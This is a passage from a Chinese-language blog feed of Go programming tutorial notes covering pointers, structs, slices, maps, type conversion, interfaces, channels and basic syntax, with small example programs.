*type</code></p><p><code>type</code>为指针类型，<code>name</code>为指针变量名，<code>*</code>号用于指定变量是一个指针。</p><p>空指针：当一个指针被定义后没有分配到任何变量时，它的值为<code>nil</code></p><h2 id="指针数组"><a href="#指针数组" class="headerlink" title="指针数组"></a>指针数组</h2><p>存储数组的值：<code>var ptr [MAX]*int</code></p><h2 id="指针的指针"><a href="#指针的指针" class="headerlink" title="指针的指针"></a>指针的指针</h2><p>如果一个指针变量存放的又是另一个指针变量的地址，则称这个指针变量为指向指针的指针变量。</p><p>当定义一个指向指针的指针变量时，第一个指针存放第二个指针的地址，第二个指针存放变量的地址：</p><p><code>var ptr **int</code>声明了一个指针的指针变量的整型</p><p>访问指向指针的指针变量值需要使用两个<code>*</code>号</p><h1 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h1><p>结构体是由一系列具有相同类型或不同类型的数据构成的数据集合，结构体表示一项记录。</p><h2 id="定义结构体"><a href="#定义结构体" class="headerlink" title="定义结构体"></a>定义结构体</h2><p><code>type</code>和<code>struct</code>的使用，<code>type</code>设定了结构体的名称，<code>struct</code>定义一个新的数据类型。</p><p>定义了结构体类型，它才能用于声明一个变量</p><h2 id="访问结构体成员"><a href="#访问结构体成员" class="headerlink" title="访问结构体成员"></a>访问结构体成员</h2><p>使用<code>.</code>操作符</p><h2 id="结构体指针"><a href="#结构体指针" class="headerlink" title="结构体指针"></a>结构体指针</h2><p>用于存储结构体变量的地址，查看、修改结构体变量的成员，同其他</p><h2 id="结构体作函数参数"><a href="#结构体作函数参数" class="headerlink" title="结构体作函数参数"></a>结构体作函数参数</h2><p>结构体可以像其他数据类型一样作为参数传递给函数，<strong>是值传递</strong>。</p><p>如果想在函数体内改变结构体内容，需要使用指针</p><h1 id="切片"><a href="#切片" class="headerlink" title="切片"></a>切片</h1><p><code>Go</code>语言切片是对数组的抽象。</p><p><code>Go</code>数组的长度不可改变，<code>Go</code>中提供了一种灵活，功能强悍的内置类型切片(“动态数组”)，与数组相比切片的长度不固定的，可以追加。</p><h2 id="定义切片"><a href="#定义切片" class="headerlink" title="定义切片"></a>定义切片</h2><ol><li>声明一个未指定大小的数组<br><code>var identifier []type</code></li><li>使用<code>make()</code>函数创建<br><code>var slice []type = make([]type, len)</code>或者通过内置函数<code>make()</code>初始化切片<code>s</code><br><code>s :=make([]int,len,cap)</code>,<code>[]int</code>标识为其元素类型为<code>int</code>的切片。<br><code>make()</code>函数这里容量可选</li></ol><h2 id="切片的初始化"><a href="#切片的初始化" class="headerlink" title="切片的初始化"></a>切片的初始化</h2><p>切片可以直接通过数组来初始化，也可以通过内置函数<code>make()</code>初始化。</p><p>初始化时默认<code>len=cap</code>，在追加元素时如果容量<code>cap</code>不足时将按<code>len的2</code>倍扩容。</p><p><code>s :=[] int &#123;1,2,3 &#125;</code>直接初始化切片，<code>[]</code>表示是切片类型，<code>&#123;1,2,3&#125;</code>初始化值依次是<code>1,2,3</code>。其<code>cap=len=3</code>。</p><p><code>s := arr[:]</code>初始化切片<code>s</code>，是数组<code>arr</code>的引用。</p><p><code>s := arr[startIndex:endIndex]</code>将<code>arr</code>中从下标<code>startIndex 到 endIndex-1</code>下的元素创建为一个新的切片。（不包含endIndex）</p><p><code>s := arr[startIndex:]</code>缺少<code>endIndex</code>时将表示一直到<code>arr</code>的最后一个元素。</p><p><code>s := arr[:endIndex]</code>缺少<code>startIndex</code>时将表示从<code>arr</code>的第一个元素开始。</p><p><code>s1 := s[startIndex:endIndex]</code>通过切片<code>s</code>初始化切片<code>s1</code></p><h2 id="内置函数"><a href="#内置函数" class="headerlink" title="内置函数"></a>内置函数</h2><table><thead><tr><th>名称</th><th>说明</th></tr></thead><tbody><tr><td>len()</td><td>获取切片长度</td></tr><tr><td>cap()</td><td>切片最大容量</td></tr><tr><td>append()</td><td>追加元素</td></tr><tr><td>copy()</td><td>拷贝</td></tr></tbody></table><h2 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>   numbers := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>&#125;<br>   number1:=<span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>)<br>   number2:=numbers[:<span class="hljs-number">3</span>]<br>   number3:=numbers[<span class="hljs-number">2</span>:<span class="hljs-number">5</span>]<br>   number4:=numbers[<span class="hljs-number">3</span>:<span class="hljs-number">8</span>]<br>   <span class="hljs-comment">// cap的大小与截取的位置有关</span><br>   <span class="hljs-comment">// number3 的 ptr 指向第三个元素，后面还剩8个元素所以cap=8</span><br>   <span class="hljs-comment">// number4 的 ptr 指向第四个元素，后面还剩7个元素所以cap=7</span><br>   printSlice(numbers)  <span class="hljs-comment">//len=10  cap=10 slice=[0 1 2 3 4 5 6 7 8 9]</span><br>   printSlice(number1)  <span class="hljs-comment">//len=0  cap=5 slice=[]</span><br>   printSlice(number2)  <span class="hljs-comment">//len=3  cap=10 slice=[0 1 2]</span><br>   printSlice(number3)  <span class="hljs-comment">//len=3  cap=8 slice=[2 3 4]</span><br>   printSlice(number4)  <span class="hljs-comment">//len=5  cap=7 slice=[3 4 5 6 7]</span><br><br>   <span class="hljs-comment">// append()</span><br><br>   <span class="hljs-comment">// copy()</span><br>   <br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">printSlice</span><span class="hljs-params">(x []<span class="hljs-type">int</span>)</span></span> &#123;<br>   fmt.Printf(<span class="hljs-string">&quot;len=%d  cap=%d   slice=%v\n&quot;</span>,<span class="hljs-built_in">len</span>(x),<span class="hljs-built_in">cap</span>(x),x)<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="Map（集合）"><a href="#Map（集合）" class="headerlink" title="Map（集合）"></a>Map（集合）</h1><p><code>Map</code>是一种无序的键值对的集合。遍历 <code>Map</code>时返回的键值对的顺序是不确定的。</p><p><code>Map</code>是引用类型，如果将一个<code>Map</code>传递给一个函数或赋值给另一个变量，它们都指向同一个底层数据结构，因此对<code>Map</code>的修改会影响到所有引用它的变量</p><h2 id="定义Map"><a href="#定义Map" class="headerlink" title="定义Map"></a>定义Map</h2><ol><li>make函数</li></ol><p><code>map := make(map[KeyType]ValueType, cap)</code><br>2. map关键字</p><p><code> m := map[string]int&#123;&quot;apple&quot;: 1, &quot;banana&quot;:2&#125;</code></p><h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>   <span class="hljs-keyword">var</span> siteMap <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span> <span class="hljs-comment">/*创建集合 */</span><br>   siteMap = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span>)<br><br>   <span class="hljs-comment">/* map 插入 key - value 对,各个国家对应的首都 */</span><br>   siteMap [ <span class="hljs-string">&quot;Google&quot;</span> ] = <span class="hljs-string">&quot;谷歌&quot;</span><br>   siteMap [ <span class="hljs-string">&quot;Runoob&quot;</span> ] = <span class="hljs-string">&quot;菜鸟教程&quot;</span><br>   siteMap [ <span class="hljs-string">&quot;Baidu&quot;</span> ] = <span class="hljs-string">&quot;百度&quot;</span><br>   siteMap [ <span class="hljs-string">&quot;Wiki&quot;</span> ] = <span class="hljs-string">&quot;维基百科&quot;</span><br><br>   <span class="hljs-comment">// 遍历Map</span><br>   <span class="hljs-keyword">for</span> site := <span class="hljs-keyword">range</span> siteMap &#123;<br>      fmt.Println(site, <span class="hljs-string">&quot;首都是&quot;</span>, siteMap [site])<br>   &#125;<br><br>   <span class="hljs-comment">// 获取元素</span><br>   v1 := siteMap[ <span class="hljs-string">&quot;Google&quot;</span> ]<br><br>   <span class="hljs-comment">// 修改元素</span><br>   siteMap[ <span class="hljs-string">&quot;Wiki&quot;</span> ] = <span class="hljs-string">&quot;维基&quot;</span><br><br>   <span class="hljs-comment">// 获取Map的长度</span><br>   <span class="hljs-built_in">len</span> := <span class="hljs-built_in">len</span>(siteMap)<br><br>   <span class="hljs-comment">/*查看元素在集合中是否存在 */</span><br>   name, ok := siteMap [ <span class="hljs-string">&quot;Facebook&quot;</span> ] <span class="hljs-comment">/*如果确定是真实的,则存在,否则不存在 */</span><br>   <span class="hljs-comment">/*fmt.Println(capital) */</span><br>   <span class="hljs-comment">/*fmt.Println(ok) */</span><br>   <span class="hljs-keyword">if</span> (ok) &#123;<br>      fmt.Println(<span class="hljs-string">&quot;Facebook 的 站点是&quot;</span>, name)<br>   &#125; <span class="hljs-keyword">else</span> &#123;<br>      fmt.Println(<span class="hljs-string">&quot;Facebook 站点不存在&quot;</span>)<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="delete-函数"><a href="#delete-函数" class="headerlink" title="delete()函数"></a>delete()函数</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>   <span class="hljs-comment">/* 创建map */</span><br>   countryCapitalMap := <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;France&quot;</span>: <span class="hljs-string">&quot;Paris&quot;</span>, <span class="hljs-string">&quot;Italy&quot;</span>: <span class="hljs-string">&quot;Rome&quot;</span>, <span class="hljs-string">&quot;Japan&quot;</span>: <span class="hljs-string">&quot;Tokyo&quot;</span>, <span class="hljs-string">&quot;India&quot;</span>: <span class="hljs-string">&quot;New delhi&quot;</span>&#125;<br><br>   fmt.Println(<span class="hljs-string">&quot;原始地图&quot;</span>)<br><br>   <span class="hljs-comment">/* 打印地图 */</span><br>   <span class="hljs-keyword">for</span> country := <span class="hljs-keyword">range</span> countryCapitalMap &#123;<br>      fmt.Println(country, <span class="hljs-string">&quot;首都是&quot;</span>, countryCapitalMap [ country ])<br>   &#125;<br><br>   <span class="hljs-comment">/*删除元素*/</span> <br>   <span class="hljs-built_in">delete</span>(countryCapitalMap, <span class="hljs-string">&quot;France&quot;</span>)<br>   fmt.Println(<span class="hljs-string">&quot;法国条目被删除&quot;</span>)<br><br>   fmt.Println(<span class="hljs-string">&quot;删除元素后地图&quot;</span>)<br><br>   <span class="hljs-comment">/*打印地图*/</span><br>   <span class="hljs-keyword">for</span> country := <span class="hljs-keyword">range</span> countryCapitalMap &#123;<br>      fmt.Println(country, <span class="hljs-string">&quot;首都是&quot;</span>, countryCapitalMap [ country ])<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h1><h2 id="数值类型转换"><a href="#数值类型转换" class="headerlink" title="数值类型转换"></a>数值类型转换</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>   <span class="hljs-keyword">var</span> sum <span class="hljs-type">int</span> = <span class="hljs-number">17</span><br>   <span class="hljs-keyword">var</span> count <span class="hljs-type">int</span> = <span class="hljs-number">5</span><br>   <span class="hljs-keyword">var</span> mean <span class="hljs-type">float32</span><br>   <br>   mean = <span class="hljs-type">float32</span>(sum)/<span class="hljs-type">float32</span>(count)<br>   fmt.Printf(<span class="hljs-string">&quot;mean 的值为: %f\n&quot;</span>,mean)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="字符串类型转换"><a href="#字符串类型转换" class="headerlink" title="字符串类型转换"></a>字符串类型转换</h2><p>熟习<code>strconv</code>包中的<code>Atoi()</code>和<code>Itoa()</code>函数</p><blockquote><p><code>Atoi()</code>函数返回两个值，第一个是转换后的整型值，第二个是可能发生的错误，我们可以使用空白标识符<code>_</code>来忽略这个错误</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;fmt&quot;</span><br>    <span class="hljs-string">&quot;strconv&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>   str := <span class="hljs-string">&quot;123&quot;</span><br>   num, err := strconv.Atoi(str)<br>   <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>      fmt.Println(<span class="hljs-string">&quot;转换错误:&quot;</span>, err)<br>   &#125; <span class="hljs-keyword">else</span> &#123;<br>      fmt.Printf(<span class="hljs-string">&quot;字符串 &#x27;%s&#x27; 转换为整数为：%d\n&quot;</span>, str, num)<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h1><p>接口可以让我们将不同的类型绑定到一组公共的方法上，从而实现多态和灵活的设计。</p><p>Go 语言中的接口是隐式实现的，也就是说，如果一个类型实现了一个接口定义的所有方法，那么它就自动地实现了该接口。因此，我们可以通过将接口作为参数来实现对不同类型的调用，从而实现多态。</p><h2 id="接口类型转换"><a href="#接口类型转换" class="headerlink" title="接口类型转换"></a>接口类型转换</h2><ol><li><p>类型断言<br>将接口类型转换为指定类型：<code>value.(type)</code>或<code>value.(T)</code></p><p>如果类型断言成功，它将返回转换后的值和一个布尔值，表示转换是否成功。</p></li><li><p>类型转换</p></li></ol><p>将一个接口类型的值转换为另一个接口类型：<code>T(value)</code></p><p>在类型转换中，我们必须保证要转换的值和目标接口类型之间是兼容的。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>   <span class="hljs-keyword">var</span> i <span class="hljs-keyword">interface</span>&#123;&#125; = <span class="hljs-string">&quot;Hello, World&quot;</span><br>   str, ok := i.(<span class="hljs-type">string</span>)<br>   <span class="hljs-keyword">if</span> ok &#123;<br>      fmt.Printf(<span class="hljs-string">&quot;&#x27;%s&#x27; is a string\n&quot;</span>, str)<br>   &#125; <span class="hljs-keyword">else</span> &#123;<br>      fmt.Println(<span class="hljs-string">&quot;conversion failed&quot;</span>)<br>   &#125;<br>&#125;<br><br><span class="hljs-comment">// 例二</span><br><span class="hljs-keyword">type</span> Writer <span class="hljs-keyword">interface</span> &#123;<br>    Write([]<span class="hljs-type">byte</span>) (<span class="hljs-type">int</span>, <span class="hljs-type">error</span>)<br>&#125;<br><br><span class="hljs-keyword">type</span> StringWriter <span class="hljs-keyword">struct</span> &#123;<br>    str <span class="hljs-type">string</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(sw *StringWriter)</span></span> Write(data []<span class="hljs-type">byte</span>) (<span class="hljs-type">int</span>, <span class="hljs-type">error</span>) &#123;<br>    sw.str += <span class="hljs-type">string</span>(data)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">len</span>(data), <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-keyword">var</span> w Writer = &amp;StringWriter&#123;&#125;<br>    sw := w.(*StringWriter)<br>    sw.str = <span class="hljs-string">&quot;Hello, World&quot;</span><br>    fmt.Println(sw.str)<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="通道-channel"><a href="#通道-channel" class="headerlink" title="通道 channel"></a>通道 channel</h1><p>通道（channel）是用来传递数据的一个数据结构。</p><p>通道可用于两个<code>goroutine</code>之间通过传递一个指定类型的值来同步运行和通讯。操作符<code>&lt;-</code>用于指定通道的方向，发送或接收。如果未指定方向，则为双向通道。</p><p>声明：使用chan关键字，通道在使用前必须先创建：<code>ch := make(chan int)</code></p><p>通道缓冲区</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;数据类型&quot;&gt;&lt;a href=&quot;#数据类型&quot; class=&quot;headerlink&quot; title=&quot;数据类型&quot;&gt;&lt;/a&gt;数据类型&lt;/h1&gt;&lt;p&gt;数据类型的出现是为了把数据分成所需内存大小不同的数据，编程的时候需要用大数据的时候才需要申请大内存，就可以充分利用内存。&lt;/</summary>
      
    
    
    
    <category term="Golang" scheme="http://lexlady.top/categories/Golang/"/>
    
    
  </entry>
  
  <entry>
    <title>Go基础语法</title>
    <link href="http://lexlady.top/2023/05/05/Golang/go-BasicGrammer/"/>
    <id>http://lexlady.top/2023/05/05/Golang/go-BasicGrammer/</id>
    <published>2023-05-05T06:45:56.000Z</published>
    <updated>2023-08-09T16:08:00.666Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Go语言基础语法"><a href="#Go语言基础语法" class="headerlink" title="Go语言基础语法"></a>Go语言基础语法</h1><h2 id="go标记"><a href="#go标记" class="headerlink" title="go标记"></a>go标记</h2><p>Go 程序可以由多个标记组成，可以是关键字，标识符，常量，字符串，符号。<code>fmt.Println(&quot;Hello,Go!!&quot;)</code>这一个语句就由6个标记组成：</p><ul><li>fmt</li><li>.</li><li>Println</li><li>(</li><li>“Hello,Go!!”</li><li>)</li></ul><h2 id="行分隔符"><a href="#行分隔符" class="headerlink" title="行分隔符"></a>行分隔符</h2><p>GO程序中，一行代表一个语句结束。每个语句<strong>不需要</strong>像 C 家族中的其它语言一样以<strong>分号1<code>;</code>结尾</strong>，因为这些工作都将由 Go 编译器自动完成。</p><blockquote><p>如果你打算将多个语句写在同一行，它们则必须使用<code>;</code>人为区分，但在实际开发中我们并不鼓励这种做法。</p></blockquote><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>注释不会被编译，每一个包应该有相关注释。</p><p>单行注释是最常见的注释形式，你可以在任何地方使用以 &#x2F;&#x2F; 开头的单行注释。</p><p>多行注释也叫块注释，均已以 &#x2F;* 开头，并以 *&#x2F; 结尾。如：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 单行注释</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> 我是多行注释</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><h2 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h2><p>用来命名变量、类型等程序实体。</p><p>第一个字符必须是字母或下划线而不能是数字。且不包括关键字、不包含运算符</p><p><code>_</code>本身就是一个特殊的标识符，被称为空白标识符。它可以像其他标识符那样用于变量的声明或赋值（任何类型都可以赋值给它），但任何赋给这个标识符的值都将被抛弃，因此这些值不能在后续的代码中使用，也不可以使用这个标识符作为变量对其它变量进行赋值或运算。</p><h2 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h2><table><thead><tr><th></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>break</td><td>default</td><td>func</td><td>interface</td><td>select</td></tr><tr><td>case</td><td>defer</td><td>go</td><td>map</td><td>struct</td></tr><tr><td>chan</td><td>else</td><td>goto</td><td>package</td><td>switch</td></tr><tr><td>const</td><td>fallthrough</td><td>if</td><td>range</td><td>type</td></tr><tr><td>continue</td><td>for</td><td>import</td><td>return</td><td>var</td></tr></tbody></table><p>预定义标识符：</p><table><thead><tr><th></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>append</td><td>bool</td><td>byte</td><td>cap</td><td>close</td></tr><tr><td>copy</td><td>false</td><td>float32</td><td>float64</td><td>imag</td></tr><tr><td>int32</td><td>int64</td><td>iota</td><td>len</td><td>make</td></tr><tr><td>print</td><td>println</td><td>real</td><td>recover</td><td>string</td></tr></tbody></table><h2 id="空格的使用"><a href="#空格的使用" class="headerlink" title="空格的使用"></a>空格的使用</h2><p>空格通常用于分隔标识符、关键字、运算符和表达式，以提高代码的可读性。</p><ul><li>Go语言中变量的声明必须使用空格隔开</li><li>在关键字和表达式之间要使用空格</li><li>在函数调用时，函数名和左边等号之间要使用空格，参数之间也要使用空格</li><li>在运算符和操作数之间要使用空格能让程序更易阅读</li><li>在变量与运算符间加入空格，程序看起来更加美观</li></ul><h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><p>使用<code>fmt.Sprintf</code>或<code>fmt.Printf</code>格式化字符串并赋值给新串</p><h3 id="fmt-Sprintf"><a href="#fmt-Sprintf" class="headerlink" title="fmt.Sprintf"></a>fmt.Sprintf</h3><p>根据格式化参数生成格式化的字符串并<strong>返回该字符串</strong></p><p><code>fmt.Sprintf(格式化样式, 参数列表...)</code></p><ul><li>格式化样式：字符串形式、格式化符号<code>%</code></li><li>参数列表：多个参数以逗号分隔，个数必须与格式化样式中的个数一一对应，否则运行时会报错。</li></ul><p>Go 字符串格式化符号:  </p><table><thead><tr><th>格式</th><th>描述</th></tr></thead><tbody><tr><td>%v</td><td>按值的本来值输出</td></tr><tr><td>%+v</td><td>在 %v 基础上，对结构体字段名和值进行展开</td></tr><tr><td>%#v</td><td>输出 Go 语言语法格式的值</td></tr><tr><td>%T</td><td>输出 Go 语言语法格式的类型和值</td></tr><tr><td>%%</td><td>输出 % 本体</td></tr><tr><td>%b</td><td>整型以二进制方式显示</td></tr><tr><td>%o</td><td>整型以八进制方式显示</td></tr><tr><td>%d</td><td>整型以十进制方式显示</td></tr><tr><td>%x</td><td>整型以十六进制方式显示</td></tr><tr><td>%X</td><td>整型以十六进制方式显示，字母大写</td></tr><tr><td>%U</td><td>Unicode 字符</td></tr><tr><td>%f</td><td>浮点数</td></tr><tr><td>%p</td><td>指针，十六进制方式显示</td></tr></tbody></table><p>Example：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;fmt&quot;</span><br>    <span class="hljs-string">&quot;io&quot;</span><br>    <span class="hljs-string">&quot;os&quot;</span><br>)<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><br>    <span class="hljs-comment">// 声明数字变量</span><br>    <span class="hljs-keyword">const</span> num1, num2, num3 = <span class="hljs-number">5</span>, <span class="hljs-number">10</span>, <span class="hljs-number">15</span><br> <br>    <span class="hljs-comment">// 调用 Sprintf() 函数</span><br>    s := fmt.Sprintf(<span class="hljs-string">&quot;%d + %d = %d&quot;</span>, num1, num2, num3)<br> <br>    <span class="hljs-comment">// 使用 WriteString() 函数将结果输出到终端 to write the</span><br>    <span class="hljs-comment">//  &quot;os.Stdout&quot; 为字符串的内容</span><br>    io.WriteString(os.Stdout, s)<br> <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="fmt-Printf"><a href="#fmt-Printf" class="headerlink" title="fmt.Printf"></a>fmt.Printf</h3><p>根据格式化参数生成格式化的字符串并<strong>写入标准输出</strong>。<br>与<code>fmt.Sprintf</code>格式类似，但<code>fmt.Printf</code>直接输出，更方便调试<br>字符串连接：通过<code>+</code>实现：</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Go语言基础语法&quot;&gt;&lt;a href=&quot;#Go语言基础语法&quot; class=&quot;headerlink&quot; title=&quot;Go语言基础语法&quot;&gt;&lt;/a&gt;Go语言基础语法&lt;/h1&gt;&lt;h2 id=&quot;go标记&quot;&gt;&lt;a href=&quot;#go标记&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    <category term="Golang" scheme="http://lexlady.top/categories/Golang/"/>
    
    
  </entry>
  
  <entry>
    <title>Go环境安装</title>
    <link href="http://lexlady.top/2023/05/05/Golang/go_env/"/>
    <id>http://lexlady.top/2023/05/05/Golang/go_env/</id>
    <published>2023-05-05T06:45:56.000Z</published>
    <updated>2023-08-14T08:55:56.427Z</updated>
    
